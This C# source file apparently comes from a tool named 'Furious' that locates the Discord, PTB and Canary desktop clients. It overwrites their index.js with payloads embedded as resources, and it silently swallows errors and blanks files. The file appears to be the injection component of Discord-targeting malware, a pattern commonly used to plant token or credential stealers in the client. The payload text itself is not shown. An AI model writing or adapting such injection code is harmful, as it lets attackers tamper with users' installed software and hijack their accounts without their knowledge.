using System.Diagnostics;
using System.IO;
using System.Reflection;

namespace Furious
{
	internal class FileManagement
	{
		internal static string PTBPath
		{
			get
			{
				return FileManagement._ptbpath;
			}
			set
			{
				FileManagement._ptbpath = value;
			}
		}
		internal static string DiscordPath
		{
			get
			{
				return FileManagement._discordpath;
			}
			set
			{
				FileManagement._discordpath = value;
			}
		}

		internal static string CanaryPath
		{
			get
			{
				return FileManagement._canarypath;
			}
			set
			{
				FileManagement._canarypath = value;
			}
		}

		internal static void CleanFile(string path)
		{
			try
			{
				using (StreamWriter streamWriter = new StreamWriter(path))
				{
					streamWriter.Write(string.Empty);
				}
			}
			catch
			{
			}
		}

		internal static void WriteDiscord(string path)
		{
			if (File.Exists(FileManagement.DiscordPath))
			{
				try
				{
					string value;
					using (StreamReader streamReader = new StreamReader(Assembly.GetExecutingAssembly().GetManifestResourceStream("Furious.Resources.index.txt")))
					{
						value = streamReader.ReadToEnd();
					}
					using (StreamWriter streamWriter = new StreamWriter(path))
					{
						streamWriter.Write(value);
					}
				}
				catch
				{
					Debug.Write("Error writing to index.js in Discord path.");
				}
			}
			if (File.Exists(FileManagement.PTBPath))
			{
				try
				{
					string value;
					using (StreamReader streamReader2 = new StreamReader(Assembly.GetExecutingAssembly().GetManifestResourceStream("Furious.Resources.ptb.txt")))
					{
						value = streamReader2.ReadToEnd();
					}
					using (StreamWriter streamWriter2 = new StreamWriter(path))
					{
						streamWriter2.Write(value);
					}
				}
				catch
				{
					Debug.Write("Error writing to index.js in DiscordPTB path.");
				}
			}
			if (File.Exists(FileManagement.CanaryPath))
			{
				try
				{
					string value;
					using (StreamReader streamReader3 = new StreamReader(Assembly.GetExecutingAssembly().GetManifestResourceStream("Furious.Resources.canary.txt")))
					{
						value = streamReader3.ReadToEnd();
					}
					using (StreamWriter streamWriter3 = new StreamWriter(path))
					{
						streamWriter3.Write(value);
					}
				}
				catch
				{
					Debug.Write("Error writing to index.js in Discord Canary path.");
				}
			}
		}

		internal static string _ptbpath;
		internal static string _discordpath;
		internal static string _canarypath;
	}
}